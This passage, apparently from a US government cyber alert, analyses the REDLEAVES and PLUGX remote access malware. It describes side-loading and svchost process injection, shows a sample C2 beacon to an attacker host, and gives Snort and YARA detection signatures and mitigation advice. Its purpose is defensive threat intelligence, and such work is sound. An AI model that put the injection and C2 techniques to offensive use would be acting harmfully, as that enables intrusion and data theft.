Analyzed Sample of REDLEAVES</em></p><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\" width=\"100%\"><tbody><tr><td style=\"width: 100%; height: 49px;\"><p><code>[ Unique Ascii strings ] --------------------</code></p><p><code>red_autumnal_leaves_dllmain.dll</code></p><p><code>windowsupdates.dnset.com windowsupdates.dnset.com</code></p><p><code>windowsupdates.dnset.com</code></p><p><code>2016-5-10-INCO</code></p><p><code>john1234</code></p><p><code>Feb 04 2015</code></p><p><code>127.0.0.1 169.254</code></p><p><code>tcp</code></p><p><code>https</code></p><p><code>http</code></p><p><code>[ Unique Unicode strings ] ------------------</code></p><p><code>RedLeavesCMDSimulatorMutex</code></p><p><code>QN4869MD</code></p><p><code>\\\\\\\\.\\\\pipe\\\\NamePipe_MoreWindows</code></p><p><code>network.proxy.type</code></p><p><code>network.proxy.http_port</code></p><p><code>network.proxy.http network.proxy.autoconfig_url</code></p><p><code>network.proxy.</code></p><p><code>a([a-zA-Z0-9])</code></p><p><code>b([ \\\\t])</code></p><p><code>c([a-zA-Z])</code></p><p><code>d([0-9])</code></p><p><code>h([0-9a-fA-F])</code></p><p><code>n(\\r|(\\r?\\n)) q(\\\"[^\\\"]*\\\")|('[^']*')</code></p><p><code>w([a-zA-Z]+)</code></p><p><code>z([0-9]+)</code></p></td></tr></tbody></table><div style=\"clear: both;\"> </div><h4>Malware Execution Analysis</h4><p><strong>File Name: VeetlePlayer.exe</strong></p><p><strong>MD5</strong>: 9d0da088d2bb135611b5450554c99672</p><p><strong>File Size</strong>: 25704 bytes (25.1 KB)</p><p><strong>Description</strong>: This is the executable that calls the exports located within libvlc.dll</p><p> </p><p><strong>File Name: libvlc.dll</strong></p><p><strong>MD5</strong>: 9A8C76271210324D97A232974CA0A6A3</p><p><strong>File Size</strong>: 33792 bytes (33.0 KB)</p><p><strong>Description</strong>: This is the loader and decoder for mtcReport.ktc, the combined shellcode and implant file.</p><p> </p><p><strong>File Name: mtcReport.ktc</strong></p><p><strong>MD5</strong>: 3045E77E1E9CF9D9657AEA71AB5E8947</p><p><strong>File Size</strong>: 231076 bytes (225.7 KB)</p><p><strong>Description</strong>: This is the encoded shellcode and implant file. When this file is decoded, the shellcode precedes the actual implant, which resides at offset 0x1292 from the beginning of the shellcode in memory. The implant has the MZ and PE flags replaced with the value 0xFF.</p><p> </p><p>All three of these files must be present for execution of the malware to succeed.</p><p>When all files are present and the VeetlePlayer.exe file is executed, it will make calls to the following DLL exports within the libvlc.dll file:</p><ul><li>VLC_Version checks to see if its calling file is named “VeetlePlayer.exe”. If the calling file is named something else, execution will terminate and no shellcode will be loaded.</li><li>VLC_Create reads in the contents of the file mtcReport.ktc.</li><li>VLC_Init takes in the offset in which the encoded shellcode/implant file is located and deobfuscates it. After deobfuscation, this export executes the shellcode.</li><li>VLC_Destroy does nothing other than perform a return 0.</li><li>VLC_AddIntf and VLC_CleanUp simply call the export VLC_Destroy, which returns 0.</li></ul><p>When the libvlc.dll decodes the shellcode/implant, it calls the shellcode at the beginning of the data blob in memory. The shellcode then activates a new instance of svchost.exe and suspends it. It then makes a call to WriteProcessMemory() and inserts the implant with the damaged MZ and PE headers into its memory space. It then resumes execution of svchost.exe, which runs the implant.</p><p>The resulting decoded shellcode with the implant file below it can have a variable MD5 based on how it is dumped from memory. The MD5 checksums of two instances of decoded shellcode are:</p><ol><li>ba4b4087370780dc988d55cbb9de885d</li><li>3d032ba5f73cbc398f1a77af92077cd8</li></ol><p>Table 4 contains the implant resulting from the original implant’s separation from the shellcode and the repair of its MZ and PE flags.</p><p><em>Table 4: Resulting Implant from Shellcode Separation</em></p><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\" width=\"100%\"><tbody><tr><td style=\"width: 100%; height: 142px;\"><p><code><strong>File Name</strong>: red_autumnal_leaves_dllmain.dll</code></p><p><code><strong>MD5</strong>: 3EBBFEEE3A832C92BB60B531F749230E</code></p><p><code><strong>File Size</strong>: 226304 bytes (221.0 KB)</code></p><p><code><strong>PE Compile Date</strong>: 10 May 2016</code></p><p><code>During execution, the file will create two mutexes called RedLeavesCMDSimulatorMutex and QN4869MD. It checks the QN4869MD mutex to see if it is already running. It will then perform initial enumeration of the system to include operating system versions, number of processors, RAM, and CPU information.</code></p></td></tr></tbody></table><div style=\"clear: both;\"> </div><h4>PLUGX</h4><p>PLUGX is a sophisticated Remote Access Tool (RAT) operating since approximately 2012. Although there are now many variants of this RAT in existence today, there are still characteristics common to most variants.</p><p>Typically, PLUGX uses three components to install itself.</p><ol><li>A non-malicious executable</li><li>A malicious DLL/installer</li><li>An encoded payload – the PLUGX RAT.</li></ol><p>A non-malicious executable with one or more imports is used to start the installation process. The executable will likely exist in a directory not normally associated with its use. In some cases, the actor may use an executable signed with a valid certificate, and rename the DLL and encoded payload with file names that suggest they are related to the trusted file. Importantly, the actor seems to vary the encoding scheme used to protect the encoded payload to stifle techniques used by AV vendors to develop patterns to detect it. The payload is either encoded with a single byte or encrypted and decompressed. Recently, NCCIC has observed a case where the encoded payload contains a decoding stub within itself, beginning at byte zero. The malware simply reads this payload and executes it starting at byte zero. The stub then decodes and executes the rest of itself in memory. Notably, this stub varies in its structure and algorithm, again stifling detection by signature based security software. The PLUGX malware is never stored on disk in an unencrypted or decoded format.</p><p>When the initial executable is launched, the imported library, usually a separate DLL, is replaced with a malicious version that in turn decodes and installs the third and final component, which is the PLUGX rat itself. Typically, the PLUGX component is obfuscated and contains no visible executable code until it is unpacked in memory, protecting it from AV/YARA scans while static. During the evolution of these PLUGX compromises, NCCIC noted an increasing implementation of protections of the actual decoded PLUGX in memory. For example, the most recent version we looked at implements a secure strings method, which hides the majority of the common commands used by PLUGX. This is an additional feature designed to thwart signature based security tools.</p><p>Once the PLUGX RAT is installed on the victim, the actors has complete C2 capabilities of the victim system, including the ability to take screenshots and download files from the compromised system. The communications between the RAT (installed on the victim system) and the PLUGX C2 server are encoded to secure the communication and stifle detection by signature based network signature tools.</p><p>The advanced capabilities of PLUGX are implemented via a plugin framework. Each plugin operates independently in its own unique thread within the service. The modules may vary based on variants. Table 5 lists the modules and capabilities contained within one sample recently analyzed by NCCIC.</p><p><em>Table 5: Modules and Capabilities of PLUGX</em></p><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><thead><tr><th style=\"width: 132px;\"><p><strong>Module Name</strong></p></th><th style=\"width: 499px;\"><p><strong>Capability</strong></p></th></tr></thead><tbody><tr><td style=\"width: 132px;\"><p>Disk</p></td><td style=\"width: 499px;\"><p>wide range of system-related capabilities including file / directory / drive enumeration, file / directory creation, create process, and obtain environment variables</p></td></tr><tr><td style=\"width: 132px;\"><p>Keylog</p></td><td style=\"width: 499px;\"><p>logs keystrokes and saves data to log file</p></td></tr><tr><td style=\"width: 132px;\"><p>Nethood</p></td><td style=\"width: 499px;\"><p>enumerates the host's network resources via the Windows multiple provider router DLL</p></td></tr><tr><td style=\"width: 132px;\"><p>Netstat</p></td><td style=\"width: 499px;\"><p>set the state of a TCP connection or obtain the extended TCP or UDP tables (lists of network endpoints available to a process) of each active process on the host</p></td></tr><tr><td style=\"width: 132px;\"><p>Option</p></td><td style=\"width: 499px;\"><p>provides the ability to initiate a system shutdown, adjust shutdown-related privileges for a given process, and lock the user's workstation</p></td></tr><tr><td style=\"width: 132px;\"><p>Portmap</p></td><td style=\"width: 499px;\"><p>port mapping</p></td></tr><tr><td style=\"width: 132px;\"><p>Process</p></td><td style=\"width: 499px;\"><p>process enumeration, termination, and capability to obtain more in-depth information pertaining to each process (e.g. CompanyName, FileDescription, FileVersion of each module loaded by the process)</p></td></tr><tr><td style=\"width: 132px;\"><p>Regedit</p></td><td style=\"width: 499px;\"><p>create, read, update &amp; delete registry entries</p></td></tr><tr><td style=\"width: 132px;\"><p>Screen</p></td><td style=\"width: 499px;\"><p>capability to capture screenshots of the system</p></td></tr><tr><td style=\"width: 132px;\"><p>Service</p></td><td style=\"width: 499px;\"><p>start, stop, remove, configure &amp; query services</p></td></tr><tr><td style=\"width: 132px;\"><p>Shell</p></td><td style=\"width: 499px;\"><p>remote shell access</p></td></tr><tr><td style=\"width: 132px;\"><p>SQL</p></td><td style=\"width: 499px;\"><p>enumerate SQL databases and available drivers; execute SQL queries</p></td></tr><tr><td style=\"width: 132px;\"><p>Telnet</p></td><td style=\"width: 499px;\"><p>provides a telnet interface</p></td></tr></tbody></table><p>The PLUGX operator may dynamically add, remove, or update PLUGX plugins during runtime. This provides the ability to dynamically adjust C2 capabilities based on the requirements of the C2 operator.</p><p>Network activity is often seen as POST requests similar to that shown in table 6. Network defenders can look to detect non-SSL HTTP traffic on port 443, which can be indicative of malware traffic. The PLUGX malware is also seen using TCP ports 80, 8080, and 53.</p><p><em>Table 6: Sample PLUGX Beacon</em></p><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\" width=\"100%\"><tbody><tr><td style=\"width: 100%; height: 229px;\"><div><code>POST /D15DB9E25ADA34EC9E559736 HTTP/1.1          </code></div><div><code>Accept:             */*</code></div><div><code>HX1:     0</code></div><div><code>HX2:     0</code></div><div><code>HX3:     61456</code></div><div><code>HX4:     1</code></div><div><code>User-Agent:       Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)</code></div><div><code>Host:    sc.weboot.info:443</code></div><div><code>Content-Length:             0</code></div><div><code>Cache-Control: no-cache</code></div></td></tr></tbody></table><p>Even though the beacon went to port 443, which is commonly used for encrypted HTTP communications, this traffic was plaintext HTTP, as is common for this variant of PLUGX.</p><h4>For IT Service Providers</h4><p>All organizations that provide IT services as a commodity for other organizations should evaluate their infrastructure to determine if related activity has taken place. Active monitoring of network traffic for the indicators of compromise (IOCs) provided in this report, as well as behavior analysis for similar activity, should be conducted to identify C2 traffic. In addition, frequency analysis should be conducted at the lowest level possible to determine any unusual fluctuation in bandwidth indicative of a potential data exfiltration. Both management and client systems should be evaluated for host indicators provided. If an intrusion is suspected, please reach out to the NCCIC at the contact information provided at the end of this report.</p><h4>For Private Organizations and Government Agencies</h4><p>All organizations should include the IOCs provided in their normal intrusion detection systems for continual analysis. Organizations that determine their risk to be elevated due to alignment to the sectors being targeted, unusual detected activity, or other factors, should conduct a dedicated investigation to identify any related activity. Organizations which leverage external IT service providers should validate with their providers that due diligence is being conducted to validate if there are security concerns with their specific provider. If an intrusion is suspected, please reach out to the NCCIC at the contact information provided at the end of this report.<a name=\"3_1_U__FOUO__Implant_Capabilities\" id=\"3_1_U__FOUO__Implant_Capabilities\"></a></p><h4>Detection</h4><p>NCCIC is providing a compilation of IOCs from a variety of sources to aid in the detection of this malware. The IOCs provided in the associated STIX package and .xlsx file were derived from various government, commercial, and publically available sources. The sources provided does not constitute an exhaustive list and the U.S. Government does not endorse or support any particular product or vendor’s information listed in this report. However, NCCIC includes this compilation here to ensure the distribution of the most comprehensive information. This alert will be updated as additional details become available.</p><p><em>Table 7: Sources Referenced</em></p><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><tbody><tr><td style=\"width: 132px;\"><p><strong>Source </strong></p></td><td style=\"width: 499px;\"><p><strong>Title</strong></p></td></tr><tr><td style=\"width: 132px;\"><p>PaloAltoNetworks</p></td><td style=\"width: 499px;\"><p>“menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations”</p></td></tr><tr><td style=\"width: 132px;\"><p>FireEye</p></td><td style=\"width: 499px;\"><p>“APT10 (Menupass Team) Renews Operations Focused on Nordic Private Industry; operations Extend to Global Partners”. February 23, 2017 10:14:00 AM,17-00001858, Version: 2</p></td></tr><tr><td style=\"width: 132px;\"><p>CyLance</p></td><td style=\"width: 499px;\"><p>“The Deception Project: A New Japanese-Centric Threat”</p></td></tr><tr><td style=\"width: 132px;\"><p>PwC/BAE Systems</p></td><td style=\"width: 499px;\"><p>“Operation Cloud Hopper: Exposing a systematic hacking operation with an</p><p>unprecedented web of global victims: April 2017”</p></td></tr><tr><td style=\"width: 132px;\"><p>JPCERT/CC</p></td><td style=\"width: 499px;\"><p>“RedLeaves-Malware Based on Open Source Rat”</p><p><a href=\"http://blog.jpcert.or.jp/2017/04/redleaves---malware-based-on-open-source-rat.html\">http://blog.jpcert.or.jp/2017/04/redleaves---malware-based-on-open-source-rat.html</a></p></td></tr><tr><td style=\"width: 132px;\"><p>NCC Group</p></td><td style=\"width: 499px;\"><p>“RedLeaves Implant-Overview”</p></td></tr><tr><td style=\"width: 132px;\"><p>National Cyber Security Centre</p></td><td style=\"width: 499px;\"><p>“Infrastructure Update Version 1.0” Reference: March 17, 2017</p></td></tr><tr><td style=\"width: 132px;\"><p>FireEye</p></td><td style=\"width: 499px;\"><p>“BUGJUICE Malware Profile”. April 05, 2017 11:45:00 AM, 17-00003261, Version: 1</p></td></tr><tr><td style=\"width: 132px;\"><p>JPCERT/CC</p></td><td style=\"width: 499px;\"><p>“ChChes- Malware that Communicates with C&amp;C Servers Using Cookie Headers”</p><p><a href=\"http://blog.jpcert.or.jp/2017/02/chches-malware--93d6.html\">http://blog.jpcert.or.jp/2017/02/chches-malware--93d6.html</a></p></td></tr></tbody></table><p>NCCIC recommends monitoring activity to the following domains and IP addresses, and scanning for evidence of the file hashes as potential indicators of infection. Some of the IOCs provided may be associated with legitimate traffic. Nevertheless, closer evaluation is warranted if the IOCs are observed. If these IOCs are found, NCCIC can provide additional assistance in further investigations. A comprehensive listing of IOCs can be found in the associated STIX package and .xlsx file.</p><h4>Network Signatures</h4><p><em>Table 8: REDLEAVES Network Signatures</em></p><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\" width=\"100%\"><tbody><tr><td style=\"width: 100%; height: 46px;\"><p> <code>alert tcp any any -&gt; any any (msg: \"REDLEAVES Implant\"; content: \"|00 00 7a 8d 9b dc|\"; offset: 2; depth: 6; content: \"|00 00|\"; offset: 10; depth: 2; sid: 314;)</code></p><p> </p><p><code>alert tcp any -&gt; any any (msg:”Suspicious PLUGX URI String”; content:”POST”; http_method; content:”/update?id=”; http_uri; fast_pattern:only; pcre:”/update\\?id=[a-fA-F0-9]{8} HTTP/”; sid:101;)</code></p></td></tr></tbody></table><div style=\"clear: both;\"> </div><p><em>Table 9: REDLEAVES YARA Signatures</em></p><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\" width=\"100%\"><tbody><tr><td style=\"width: 100%; height: 60px;\"><p><code>rule Dropper_DeploysMalwareViaSideLoading {</code></p><p><code>    meta:</code></p><p><code>            description = \"Detect a dropper used to deploy an implant via side loading. This dropper has specifically been observed deploying REDLEAVES &amp; PlugX\"</code></p><p><code>            author = \"USG\"</code></p><p><code>            true_positive = \"5262cb9791df50fafcb2fbd5f93226050b51efe400c2924eecba97b7ce437481: drops REDLEAVES. 6392e0701a77ea25354b1f40f5b867a35c0142abde785a66b83c9c8d2c14c0c3: drops plugx. \"</code></p><p><code>    strings:        </code></p><p><code>            $UniqueString = {2e 6c 6e 6b [0-14] 61 76 70 75 69 2e 65 78 65} // \".lnk\" near \"avpui.exe\"</code></p><p><code>            $PsuedoRandomStringGenerator = {b9 1a [0-6] f7 f9 46 80 c2 41 88 54 35 8b 83 fe 64} // Unique function that generates a 100 character pseudo random string.</code></p><p><code>    condition:</code></p><p><code>            any of them</code></p><p><code>}</code></p></td></tr><tr><td style=\"width: 100%; height: 60px;\"><p><code>rule REDLEAVES_DroppedFile_ImplantLoader_Starburn {</code></p><p><code>    meta:</code></p><p><code>            description = \"Detect the DLL responsible for loading and deobfuscating the DAT file containing shellcode and core REDLEAVES RAT\"</code></p><p><code>            author = \"USG\"</code></p><p><code>            true_positive = \"7f8a867a8302fe58039a6db254d335ae\" // StarBurn.dll</code></p><p><code>    strings:</code></p><p><code>            $XOR_Loop = {32 0c 3a 83 c2 02 88 0e 83 fa 08 [4-14] 32 0c 3a 83 c2 02 88 0e 83 fa 10} // Deobfuscation loop</code></p><p><code>    condition:</code></p><p><code>            any of them</code></p><p><code>}</code></p></td></tr><tr><td style=\"width: 100%; height: 60px;\"><p><code>rule REDLEAVES_DroppedFile_ObfuscatedShellcodeAndRAT_handkerchief {</code></p><p><code>    meta:</code></p><p><code>        description = \"Detect obfuscated .dat file containing shellcode and core REDLEAVES RAT\"</code></p><p><code>        author = \"USG\"</code></p><p><code>        true_positive = \"fb0c714cd2ebdcc6f33817abe7813c36\" // handkerchief.dat</code></p><p><code>    strings:</code></p><p><code>        $RedleavesStringObfu = {73 64 65 5e 60 74 75 74 6c 6f 60 6d 5e 6d 64 60 77 64 72 5e 65 6d 6d 6c 60 68 6f 2f 65 6d 6d} // This is 'red_autumnal_leaves_dllmain.dll' XOR'd with 0x01</code></p><p><code>    condition:</code></p><p><code>        any of them</code></p><p><code>}</code></p></td></tr><tr><td style=\"width: 100%; height: 27px;\"><p><code>rule REDLEAVES_CoreImplant_UniqueStrings {</code></p><p><code>    meta:</code></p><p><code>        description = \"Strings identifying the core REDLEAVES RAT in its deobfuscated state\"</code></p><p><code>        author = \"USG\"</code></p><p><code>    strings:</code></p><p><code>        $unique2 = \"RedLeavesSCMDSimulatorMutex\" nocase wide ascii</code></p><p><code>        $unique4 = \"red_autumnal_leaves_dllmain.dll\" wide ascii</code></p><p><code>        $unique7 = \"\\\\NamePipe_MoreWindows\" wide ascii</code></p><p><code>    condition:</code></p><p><code>      any of them</code></p><p><code>}</code></p></td></tr></tbody></table><div style=\"clear: both;\"> </div><p><em>Table 10: PLUGX Network Signatures</em></p><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\" width=\"100%\"><tbody><tr><td style=\"width: 100%; height: 60px;\"><p><code>alert tcp any any -&gt; any any (msg:\"Non-Std TCP Client Traffic contains 'HX1|3a|' 'HX2|3a|' 'HX3|3a|' 'HX4|3a|' (PLUGX Variant)\"; sid:XX; rev:1; flow:established,to_server; content:\"Accept|3a 20 2a 2f 2a|\"; nocase; content:\"HX1|3a|\"; distance:0; within:6; fast_pattern; content:\"HX2|3a|\"; nocase; distance:0; content:\"HX3|3a|\"; nocase; distance:0; content:\"HX4|3a|\"; nocase; distance:0; classtype:nonstd-tcp; priority:X;)</code></p></td></tr><tr><td style=\"width: 100%; height: 60px;\"><p><code>alert tcp any any -&gt; any any (msg:\"Non-Std TCP Client Traffic contains 'X-Session|3a|''X-Status|3a|''X-Size|3a|''X-Sn|3a|'(PLUGX)\"; sid:XX; rev:1; flow:established,to_server; content:\"X-Session|3a|\"; nocase; fast_pattern; content:\"X-Status|3a|\"; nocase; distance:0; content:\"X-Size|3a|\"; nocase; distance:0; content:\"X-Sn|3a|\"; nocase; distance:0; classtype:nonstd-tcp; priority:X;)</code></p></td></tr><tr><td style=\"width: 100%; height: 60px;\"><p><code>alert tcp any any -&gt; any any (msg:\"Non-Std TCP Client Traffic contains 'MJ1X|3a|' 'MJ2X|3a|' 'MJ3X|3a|' 'MJ4X|3a|' (PLUGX Variant)\"; sid:XX; rev:1; flow:established,to_server; content:\"MJ1X|3a|\"; nocase; fast_pattern; content:\"MJ2X|3a|\"; nocase; distance:0; content:\"MJ3X|3a|\"; nocase; distance:0; content:\"MJ4X|3a|\"; nocase; distance:0; classtype:nonstd-tcp; priority:X;)</code></p></td></tr><tr><td style=\"width: 100%; height: 60px;\"><p><code>alert tcp any any -&gt; any any (msg:\"Non-Std TCP Client Traffic contains 'Cookies|3a|' 'Sym1|2e|' '|2c|Sym2|2e|' '|2c|Sym3|2e|' '|2c|Sym4|2e|' (Chches Variant)\"; sid:XX; rev:1; flow:established,to_server; content:\"Cookies|3a|\"; nocase; content:\"Sym1|2e|0|3a|\"; nocase; distance:0; fast_pattern; content:\"|2c|Sym2|2e|\"; nocase; distance:0; content:\"|2c|Sym3|2e|\"; nocase; distance:0; content:\"|2c|Sym4|2e|\"; nocase; distance:0; classtype:nonstd-tcp; priority:X;)</code></p></td></tr></tbody></table><div style=\"clear: both;\"> </div><h4>Host Signatures</h4><p><em>Table 11: PLUGX and REDLEAVES YARA Signatures</em></p><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\" width=\"100%\"><tbody><tr><td style=\"width: 100%; height: 60px;\"><p><code>rule PLUGX_RedLeaves</code></p><p><code>{</code></p><p><code>meta:</code></p><p><code>author = \"US-CERT Code Analysis Team\"</code></p><p><code>date = \"03042017\"</code></p><p><code>incident = \"10118538\"</code></p><p><code>date = \"2017/04/03\"</code></p><p><code>MD5_1 = \"598FF82EA4FB52717ACAFB227C83D474\"</code></p><p><code>MD5_2 = \"7D10708A518B26CC8C3CBFBAA224E032\"</code></p><p><code>MD5_3 = \"AF406D35C77B1E0DF17F839E36BCE630\"</code></p><p><code>MD5_4 = \"6EB9E889B091A5647F6095DCD4DE7C83\"</code></p><p><code>MD5_5 = \"566291B277534B63EAFC938CDAAB8A399E41AF7D\"</code></p><p><code>info = \"Detects specific RedLeaves and PlugX binaries\"</code></p><p><code>strings:</code></p><p><code>$s0 = { 80343057403D2FD0010072F433C08BFF80343024403D2FD0010072F4 }</code></p><p><code>$s1 = \"C:\\\\Users\\\\user\\\\Desktop\\\\my_OK_2014\\\\bit9\\\\runsna\\\\Release\\\\runsna.pdb\"</code></p><p><code>$s2 = \"d:\\\\work\\\\plug4.0(shellcode)\"</code></p><p><code>$s3 = \"\\\\shellcode\\\\shellcode\\\\XSetting.h\"</code></p><p><code>$s4 = { 42AFF4276A45AA58474D4C4BE03D5B395566BEBCBDEDE9972872C5C4C5498228 }</code></p><p><code>$s5 = { 8AD32AD002D180C23830140E413BCB7CEF6A006A006A00566A006A00 }</code></p><p><code>$s6 = { EB055F8BC7EB05E8F6FFFFFF558BEC81ECC8040000535657 }</code></p><p><code>$s7 = { 8A043233C932043983C10288043283F90A7CF242890D18AA00103BD37CE2891514AA00106A006A006A0056 }</code></p><p><code>$s8 = { 293537675A402A333557B05E04D09CB05EB3ADA4A4A40ED0B7DAB7935F5B5B08 }</code></p><p><code>$s9 = \"RedLeavesCMDSimulatorMutex\"</code></p><p><code>condition:</code></p><p><code>$s0 or $s1 or $s2 and $s3 or $s4 or $s5 or $s6 or $s7 or $s8 or $s9</code></p><p><code>}</code></p></td></tr></tbody></table><div style=\"clear: both;\"> </div><h4>Other Detection Methods</h4><p><strong>Examine Port/Protocol Mismatches:</strong> Examine network traffic where the network port and protocol do not match, such as plaintext HTTP over port 443.</p><p><strong>Administrative Share Mapping:</strong> When a malicious actor tries to move laterally on a network, one of the techniques is to mount administrative shares to perform operations like uploading and downloading resources or executing commands. In addition, tools like System Internals PSEXEC will mount the shares automatically for the user. Since administrators may map administrative shares legitimately while managing components of the network, this must be taken into account.</p><ul><li>Filter network traffic for SMB mapping events and group the events by source IP, destination IP, the mounted path (providing a count of total mounts to that path), the first map time, and the last map time</li><li>Collect Windows Event Logs – Event ID 5140 (network share object was accessed) can be used to track C$ and ADMIN$ mounts by searching the Share Name field</li></ul><p><strong>VPN User authentication mismatch:</strong> A VPN user authentication match occurs when a user account authenticates to an IP address but once connected the internal IP address requests authentication tokens for other users. This may create false positives for legitimate network administrators but if this is detected, organizations should verify that the administrative accounts were legitimately used.</p><p><strong>VPN activity from VPS providers:</strong> While this may also produce false positives, VPN logins from Virtual Private Server (VPS) providers may be an indicator of VPN users attempting to hide their source IP and should be investigated.</p>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include:</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul>\t\t\n\t\t<h3>Solution</h3>\n\t\t<p>Properly implemented defensive techniques and programs make it more difficult for an adversary to gain access to a network and remain persistent yet undetected. When an effective defensive program is in place, actors should encounter complex defensive barriers. Actor activity should also trigger detection and prevention mechanisms that enable organizations to contain and respond to the intrusion more rapidly. There is no single or set of defensive techniques or programs that will completely avert all malicious activities. Multiple defensive techniques and programs should be adopted and implemented in a layered approach to provide a complex barrier to entry, increase the likelihood of detection, and decrease the likelihood of a successful compromise. This layered mitigation approach is known as defense-in-depth.</p><p>NCCIC mitigations and recommendations are based on observations made during the hunt, analysis, and network monitoring for threat actor activity, combined with client interaction.</p><h4>Whitelisting</h4><ul><li>Enable application directory whitelisting through Microsoft Software Restriction Policy (SRP) or AppLocker;</li><li>Use directory whitelisting rather than trying to list every possible permutation of applications in an environment. Safe defaults allow applications to run from PROGRAMFILES, PROGRAMFILES(X86), and SYSTEM32. All other locations should be disallowed unless an exception is granted.</li><li>Prevent the execution of unauthorized software by using application whitelisting as part of the security hardening of operating systems insulating.</li><li>Enable application directory whitelisting via the Microsoft SRP or AppLocker.</li></ul><h4>Account Control</h4><ul><li>Decrease a threat actor’s ability to access key network resources by implementing the principle of least privilege.</li><li>Limit the ability of a local administrator account to login from a local interactive session (e.g., “Deny access to this computer from the network”) and prevent access via a Remote Desktop Protocol session.</li><li>Remove unnecessary accounts, groups, and restrict root access.</li><li>Control and limit local administration.</li><li>Make use of the Protected Users Active Directory group in Windows Domains to further secure privileged user accounts against pass-the-hash compromises.</li></ul><h4>Workstation Management</h4><ul><li>Create a secure system baseline image and deploy to all workstations.</li><li>Mitigate potential exploitation by threat actors by following a normal patching cycle for all operating systems, applications, software, and all third-party software.</li><li>Apply asset and patch management processes.</li><li>Reduce the number of cached credentials to one if a laptop, or zero if a desktop or fixed asset.</li></ul><h4>Host-Based Intrusion Detection</h4><ul><li>Configure and monitor system logs through host-based intrusion detection system (HIDS) and firewall.</li><li>Deploy an anti-malware solution to prevent spyware, adware, and malware as part of the operating system security baseline.</li><li>Monitor antivirus scan results on a regular basis.</li></ul><h4>Server Management</h4><ul><li>Create a secure system baseline image, and deploy to all servers.</li><li>Upgrade or decommission end-of-life non Windows servers.</li><li>Upgrade or decommission servers running Windows Server 2003 and older versions.</li><li>Implement asset and patch management processes.</li><li>Audit for and disable unnecessary services.</li></ul><h4>Server Configuration and Logging</h4><ul><li>Establish remote server logging and retention.</li><li>Reduce the number of cached credentials to zero.</li><li>Configure and monitor system logs via a centralized security information and event management (SIEM) appliance.</li><li>Add an explicit DENY for “%USERPROFILE%”.</li><li>Restrict egress web traffic from servers.</li><li>In Windows environments, utilize Restricted Admin mode or remote credential guard to further secure remote desktop sessions against pass-the-hash compromises.</li><li>Restrict anonymous shares.</li><li>Limit remote access by only using jump servers for such access.</li></ul><h4>Change Control</h4><ul><li>Create a change control process for all implemented changes.</li></ul><h4>Network Security</h4><ul><li>An Intrusion Detection System (IDS) should:<ul style=\"list-style-type: circle;\"><li>Implement continuous monitoring.</li><li>Send alerts to a SIEM tool.</li><li>Monitor internal activity (this tool may use the same tap points as the netflow generation tools).</li></ul></li><li>Netflow Capture should:<ul style=\"list-style-type: circle;\"><li>Set a minimum retention period of 180 days.</li><li>Capture netflow on all ingress and egress points of network segments, not just at the Managed Trusted Internet Protocol Services (MTIPS) or Trusted Internet Connections (TIC) locations.</li></ul></li><li>Network Packet Capture (PCAP):<ul style=\"list-style-type: circle;\"><li>Retain PCAP data for a minimum of 24 hours.</li><li>Capture traffic on all ingress and egress points of the network.</li></ul></li><li>Use a virtual private network (VPN):<ul style=\"list-style-type: circle;\"><li>Maintain site-to-site VPN with customers.</li><li>Authenticate users utilizing site-to-site VPNs through adaptive security appliance (ASA).</li></ul></li><li>Use authentication, authorization, and accounting (AAA) for controlling network access.<ul style=\"list-style-type: circle;\"><li>Require Personal Identity Verification (PIV) authentication to an HTTPS page on the ASA in order to control access. Authentication should also require explicit rostering of PIV distinguished names (DNs) that are permitted to enhance the security posture on both networks participating in the site-to-site VPN.</li><li>Establish appropriate secure tunneling protocol and encryption.</li><li>Strengthen router configuration (e.g., avoid enabling remote management over the Internet and using default IP ranges; automatically logout after configuring routers; use encryption).</li><li>Turn off Wi-Fi protected setup (WPS), enforce the use of strong passwords, keep router firmware up-to-date; and</li><li>Improve firewall security (e.g., enable auto updates, revise firewall rules as appropriate, implement whitelists, establish packet filtering, enforce the use of strong passwords, and encrypt networks).</li></ul></li><li>Conduct regular vulnerability scans of the internal and external networks and hosted content to identify and mitigate vulnerabilities.</li><li>Define areas within the network that should be segmented to increase visibility of lateral movement by an adversary and increase the defense in-depth posture.</li><li>Develop a process to block traffic to IP addresses and domain names that have been identified as being used to aid previous malicious activities.</li></ul><h4>Network Infrastructure Recommendations</h4><ul><li>Ensure you are following National Security Agency (NSA) network device integrity (NDI) <a href=\"https://www.iad.gov/iad/library/reports/network-device-integrity-ndi-methodology.cfm\">best practices</a>.</li><li>Ensure your networking equipment has the latest available operating system and patches.</li></ul><h4>Host Recommendations</h4><ul><li>Implement policies to block workstations-to-workstation remote desktop protocol (RDP) connections through group policy object (GPO) on Windows, or a similar mechanism.</li><li>Store system logs of mission critical systems for at least one year within a SIEM.</li><li>Review the configuration of application logs to verify fields being recorded will contribute to an incident response investigation.</li></ul><h4>Users Management</h4><ul><li>Immediately set the password policy to require complex passwords for all users (minimum of 15 characters); this new requirement should be enforced as user passwords expire.</li><li>Reduce the number of domain and enterprise administrator accounts.</li><li>Create non-privileged accounts for privileged users and ensure they use the non-privileged account for all non-privileged access (e.g., web browsing, email access);</li><li>If possible, use technical methods to detect or prevent browsing by privileged accounts (authentication to web proxies would enable blocking 